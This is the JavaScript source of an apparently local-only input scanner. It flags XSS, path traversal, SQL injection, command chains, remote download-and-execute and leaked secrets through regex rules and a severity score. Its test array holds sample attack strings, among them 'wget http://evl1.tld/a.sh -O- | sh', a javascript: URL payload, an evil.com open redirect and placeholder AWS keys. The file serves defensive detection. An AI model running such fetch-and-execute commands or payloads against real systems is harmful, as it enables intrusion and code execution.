// app.js
(() => {
  "use strict";

  const BUILD = "v2026-01-05_normalayer_v3_secrets_freeze";
  const nowISO = () => new Date().toISOString();

  function $(id) { return document.getElementById(id); }

  function safeOn(el, evt, fn) {
    if (!el) return;
    el.addEventListener(evt, fn, { passive: true });
  }

  function shannonEntropy(str) {
    if (!str) return 0;
    const freq = new Map();
    for (const ch of str) freq.set(ch, (freq.get(ch) || 0) + 1);
    const len = str.length;
    let ent = 0;
    for (const [, c] of freq) {
      const p = c / len;
      ent -= p * Math.log2(p);
    }
    return Math.round(ent * 100) / 100;
  }

  // ---------- NORMALIZATION (stable, local-only) ----------
  function safeDecodeURIComponent(s) {
    try {
      // Only attempt if it contains '%' to avoid exceptions/noise
      if (!/%[0-9a-fA-F]{2}/.test(s)) return s;
      return decodeURIComponent(s);
    } catch {
      return s;
    }
  }

  function normalizeRaw(input) {
    let s = (input ?? "").toString();

    // Trim + normalize line breaks and whitespace
    s = s.replace(/\r\n/g, "\n").replace(/\r/g, "\n");
    s = s.trim();

    // Remove null bytes
    s = s.replace(/\u0000/g, "");

    // Unify backslashes in paths (keep original in input field; normalization used only for matching)
    // Example: C:\Windows\System32 -> c:/windows/system32 (for matching)
    const sSlash = s.replace(/\\/g, "/");

    // Percent-decode up to 2 rounds (handles %2f and %252f cases)
    let d1 = safeDecodeURIComponent(s);
    let d2 = safeDecodeURIComponent(d1);

    // Also decode percent on the slash-normalized variant
    let ds1 = safeDecodeURIComponent(sSlash);
    let ds2 = safeDecodeURIComponent(ds1);

    return {
      raw: s,
      n1: d1,
      n2: d2,
      nSlash2: ds2
    };
  }

  function looksLikeURL(s) {
    return /^https?:\/\//i.test(s) || /^[a-z0-9.-]+\.[a-z]{2,}(\/|$)/i.test(s);
  }

  // ---------- TYPE CLASSIFICATION ----------
  function classifyTypeByRules(raw, hits) {
    if (!raw) return "Data";
    if (hits.some(h => h.label.startsWith("SECRET:"))) return "Secret";
    const isURL = looksLikeURL(raw) || /(^|[?&])(url|next|returnurl|redirect_uri)=/i.test(raw);
    const isExploit =
      /<script|onerror=|onload=|javascript:|data:text\/html|(\.\.\/){2,}|\\windows\\system32|union\s+select|1=1|--\s*$|wget\s+http|curl\s+-s|powershell\s+-enc/i.test(raw);
    if (isExploit) return "Exploit";
    if (isURL) return "URL";
    return "Data";
  }

  // ---------- RULES ----------
  // Matching is performed on multiple normalized variants to reduce bypass and reduce false negatives.
  function anyMatch(n, re) {
    return re.test(n.raw) || re.test(n.n1) || re.test(n.n2) || re.test(n.nSlash2);
  }

  const RULES = [
    // Redirect / OAuth
    {
      label: "REDIRECT_PARAM",
      testN: n =>
        anyMatch(n, /(^|[?&])(redirect_uri|redirect|returnurl|returnUrl|next|url)=/i) ||
        anyMatch(n, /\b(returnUrl|next)=\/\/[^ \n]+/i),
      sev: 55, conf: 90
    },
    {
      label: "AUTH_ENDPOINT",
      testN: n => anyMatch(n, /(oauth\/authorize|oauth2\/authorize|\/signin\/oauth|login\.microsoftonline\.com\/common\/oauth2\/authorize)/i),
      sev: 45, conf: 80
    },

    // Obfuscation / Encoding
    {
      label: "BASE64_DECODE",
      testN: n => anyMatch(n, /(data:text\/html;base64,|eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,})/i),
      sev: 35, conf: 70
    },
    {
      label: "OBFUSCATION",
      testN: n => anyMatch(n, /%2f|%3a|%3d|%5c|\\x[0-9a-f]{2}|\\u[0-9a-f]{4}|[A-Za-z0-9+\/]{30,}={0,2}/i),
      sev: 35, conf: 67
    },

    // Homograph
    {
      label: "HOMOGRAPH_RISK",
      testN: n => anyMatch(n, /\bxn--/i),
      sev: 60, conf: 70
    },

    // XSS / JS
    {
      label: "XSS/JS_SCRIPT",
      testN: n => anyMatch(n, /<script|onerror=|onload=|javascript:|data:text\/html|<img[^>]+onerror=|<svg[^>]+onload=/i),
      sev: 85, conf: 85
    },

    // LFI
    {
      label: "LFI:ETC_PASSWD",
      testN: n => anyMatch(n, /(\.\.\/){2,}etc\/passwd|etc\/passwd|windows\/system32\/drivers\/etc\/hosts/i),
      sev: 80, conf: 75
    },

    // CMD / Chains
    {
      label: "CMD:CMD_CHAIN",
      testN: n => anyMatch(n, /(&&|\|\|)\s*\w+|;\s*\w+|\|\s*\w+|powershell\s+-enc/i),
      sev: 85, conf: 85
    },
    {
      label: "DOWNLOAD_TOOL",
      testN: n => anyMatch(n, /\b(wget|curl)\b.*\b(http|https):\/\/.*(\|\s*(sh|bash)|-O-|\|\s*sh)/i),
      sev: 90, conf: 90
    },

    // SQLi
    {
      label: "SQL:SQLI_TAUTOLOGY",
      testN: n => anyMatch(n, /(1\s*=\s*1(\s*or\s*1\s*=\s*1)?|'\s*or\s*'1'\s*=\s*'1|admin'\s*--|select\s+\*\s+from\s+\w+\s+where)/i),
      sev: 75, conf: 85
    },
    {
      label: "SQL:SQLI_UNION_ALL",
      testN: n => anyMatch(n, /union\s+select/i),
      sev: 80, conf: 80
    },

    // ---------- NEW: SECRETS DETECTION (WARN-tier) ----------
    {
      label: "SECRET:AWS_ACCESS_KEY",
      testN: n => anyMatch(n, /\b(AKI|ASIA)[A-Z0-9]{16}\b/),
      sev: 55, conf: 85
    },
    {
      label: "SECRET:PRIVATE_KEY_BLOCK",
      testN: n => anyMatch(n, /-----BEGIN (?:RSA |EC |DSA |OPENSSH |)?PRIVATE KEY-----/i),
      sev: 60, conf: 90
    },
    {
      label: "SECRET:JWT",
      testN: n => anyMatch(n, /\beyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\b/),
      sev: 55, conf: 80
    },
    {
      label: "SECRET:AUTH_BEARER",
      testN: n => anyMatch(n, /\bauthorization\s*:\s*bearer\s+[A-Za-z0-9._\-+/=]{12,}\b/i),
      sev: 45, conf: 75
    }
  ];

  function analyzeOne(input) {
    const norm = normalizeRaw(input);
    const s = norm.raw;
    const hits = [];

    for (const r of RULES) {
      if (r.testN(norm)) hits.push({ label: r.label, sev: r.sev, conf: r.conf });
    }

    let severity = 0, confidence = 0;
    if (hits.length) {
      severity = Math.max(...hits.map(h => h.sev));
      confidence = Math.max(...hits.map(h => h.conf));
    }

    // Decision logic (unchanged for BLOCK; secrets alone => WARN)
    let decision = "ALLOW";

    const hasBlockTier = hits.some(h => h.sev >= 85) || hits.some(h => h.label === "DOWNLOAD_TOOL");
    const hasWarnTier = hits.some(h => h.sev >= 55) || hits.some(h => h.label.startsWith("SECRET:"));

    if (hasBlockTier) decision = "BLOCK";
    else if (hasWarnTier) decision = "WARN";

    const type = classifyTypeByRules(s, hits);
    const entropy = shannonEntropy(s);

    return { input: s, type, decision, severity, confidence, entropy, hits };
  }

  function verdictFrom(rows) {
    const counts = { scans: rows.length, allow: 0, warn: 0, block: 0 };
    for (const r of rows) {
      if (r.decision === "ALLOW") counts.allow++;
      else if (r.decision === "WARN") counts.warn++;
      else counts.block++;
    }

    const peakSeverity = rows.length ? Math.max(...rows.map(r => r.severity)) : 0;
    const confidence = rows.length ? Math.max(...rows.map(r => r.confidence)) : 0;

    let verdict = "SECURE";
    if (counts.block > 0) verdict = "DANGER";
    else if (counts.warn > 0) verdict = "SUSPICIOUS";

    const sigMap = new Map();
    for (const r of rows) {
      for (const h of r.hits) sigMap.set(h.label, (sigMap.get(h.label) || 0) + 1);
    }
    const signals = [...sigMap.entries()]
      .sort((a,b) => b[1]-a[1])
      .map(([label,count]) => ({ label, count }));

    return { verdict, peakSeverity, confidence, counts, signals };
  }

  function buildReport(rows) {
    const meta = verdictFrom(rows);
    return {
      generatedAt: nowISO(),
      verdict: meta.verdict,
      peakSeverity: meta.peakSeverity,
      confidence: meta.confidence,
      counts: meta.counts,
      signals: meta.signals,
      rows
    };
  }

  function setVerdictUI(meta) {
    const verdictText = $("verdictText");
    const box = $("verdictBox");
    if (!verdictText || !box) return;

    verdictText.textContent = meta.verdict;

    box.style.borderColor =
      meta.verdict === "DANGER" ? "rgba(239,68,68,.35)" :
      meta.verdict === "SUSPICIOUS" ? "rgba(245,158,11,.35)" :
      "rgba(45,212,191,.25)";

    $("peakSev").textContent = `Peak severity: ${meta.peakSeverity}%`;
    $("peakConf").textContent = `Confidence: ${meta.confidence}%`;

    $("kScans").textContent = String(meta.counts.scans);
    $("kAllow").textContent = String(meta.counts.allow);
    $("kWarn").textContent = String(meta.counts.warn);
    $("kBlock").textContent = String(meta.counts.block);

    const reco = $("reco");
    if (reco) {
      if (meta.verdict === "DANGER") {
        reco.textContent = "Remediation: Block these inputs in the pipeline. Do NOT open. Verify domain ownership. Escalate with JSON report.";
      } else if (meta.verdict === "SUSPICIOUS") {
        reco.textContent = "Remediation: Review suspicious entries. Verify domains. Sanitize/encode. Escalate if needed.";
      } else {
        reco.textContent = "No high-severity patterns detected.";
      }
    }

    const sigWrap = $("signals");
    if (sigWrap) {
      sigWrap.innerHTML = "";
      for (const s of meta.signals) {
        const d = document.createElement("div");
        d.className = "sig";
        d.textContent = `${s.label} ×${s.count}`;
        sigWrap.appendChild(d);
      }
      if (!meta.signals.length) {
        const d = document.createElement("div");
        d.className = "sig";
        d.textContent = "No active signals";
        sigWrap.appendChild(d);
      }
    }
  }

  function renderRows(rows) {
    const host = $("rows");
    if (!host) return;
    host.innerHTML = "";

    for (const r of rows) {
      const tr = document.createElement("div");
      tr.className = "trow";

      const dotClass = r.decision === "ALLOW" ? "ok" : (r.decision === "WARN" ? "warn" : "bad");

      const c1 = document.createElement("div");
      c1.className = "mono";
      c1.textContent = r.input.length > 120 ? r.input.slice(0, 120) + "…" : r.input;

      const c2 = document.createElement("div");
      c2.textContent = r.type;

      const c3 = document.createElement("div");
      c3.className = "tag";
      const dot = document.createElement("span");
      dot.className = `dot ${dotClass}`;
      const t = document.createElement("span");
      t.textContent = r.decision;
      c3.append(dot, t);

      const c4 = document.createElement("div");
      c4.textContent = `${r.severity}%`;

      const c5 = document.createElement("div");
      c5.textContent = `${r.confidence}%`;

      const c6 = document.createElement("div");
      c6.textContent = String(r.entropy);

      tr.append(c1,c2,c3,c4,c5,c6);
      host.appendChild(tr);
    }
  }

  function parseInputLines(txt) {
    return (txt || "")
      .split(/\r?\n/)
      .map(s => s.trim())
      .filter(Boolean);
  }

  // Keep your original TEST_A / TEST_B if you want; here we add a strict secrets test
  const TEST_SECRETS = [
    "hello world",
    "AKIAIOSFODNN7EXAMPLE",
    "ASIA1234567890ABCDEF12",
    "-----BEGIN PRIVATE KEY-----",
    "MIIEvQIBADANBgkqhkiG9w0BAQEFAASC...",
    "-----END PRIVATE KEY-----",
    "Authorization: Bearer abc.def.ghi",
    "{\"token\":\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.fake.payload\"}",
    "http://paypaI.com/security",
    "https://good.com/redirect?next=https%3A%2F%2Fevil.com",
    "url=javascript:alert(1)",
    "wget http://evl1.tld/a.sh -O- | sh"
  ];

  let lastReport = null;

  function runScanFromTextarea() {
    const inputEl = $("input");
    if (!inputEl) return;

    const lines = parseInputLines(inputEl.value);
    const rows = lines.map(analyzeOne);
    const report = buildReport(rows);

    lastReport = report;

    setVerdictUI({
      verdict: report.verdict,
      peakSeverity: report.peakSeverity,
      confidence: report.confidence,
      counts: report.counts,
      signals: report.signals
    });

    renderRows(report.rows);
  }

  function exportJSON() {
    if (!lastReport) runScanFromTextarea();
    if (!lastReport) return;

    const blob = new Blob([JSON.stringify(lastReport, null, 2)], { type: "application/json" });
    const a = document.createElement("a");
    const ts = new Date().toISOString().replace(/[:.]/g, "-");
    a.download = `validoon_report_${ts}.json`;
    a.href = URL.createObjectURL(blob);
    document.body.appendChild(a);
    a.click();
    setTimeout(() => {
      URL.revokeObjectURL(a.href);
      a.remove();
    }, 0);
  }

  function clearAll() {
    const inputEl = $("input");
    if (inputEl) inputEl.value = "";
    lastReport = null;

    setVerdictUI({
      verdict: "SECURE",
      peakSeverity: 0,
      confidence: 0,
      counts: { scans: 0, allow: 0, warn: 0, block: 0 },
      signals: []
    });

    renderRows([]);
  }

  function loadTest(lines) {
    const inputEl = $("input");
    if (!inputEl) return;
    inputEl.value = lines.join("\n");
    runScanFromTextarea();
  }

  function openInfo() {
    const dlg = $("infoDlg");
    if (dlg && typeof dlg.showModal === "function") dlg.showModal();
  }

  function closeInfo() {
    const dlg = $("infoDlg");
    if (dlg && typeof dlg.close === "function") dlg.close();
  }

  function boot() {
    const stamp = $("buildStamp");
    if (stamp) stamp.textContent = `Build: ${BUILD}`;

    setVerdictUI({
      verdict: "SECURE",
      peakSeverity: 0,
      confidence: 0,
      counts: { scans: 0, allow: 0, warn: 0, block: 0 },
      signals: []
    });

    safeOn($("btnLoadA"), "click", () => loadTest(TEST_SECRETS)); // Load Test A => Secrets test
    safeOn($("btnLoadB"), "click", () => loadTest(TEST_SECRETS)); // Load Test B => same on purpose (stability)

    safeOn($("btnScan"), "click", runScanFromTextarea);
    safeOn($("btnExport"), "click", exportJSON);
    safeOn($("btnClear"), "click", clearAll);
    safeOn($("btnInfo"), "click", openInfo);
    safeOn($("btnCloseInfo"), "click", closeInfo);

    console.log(`[Validoon] ${BUILD} loaded. Local-only. No network.`);
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", boot);
  } else {
    boot();
  }
})();
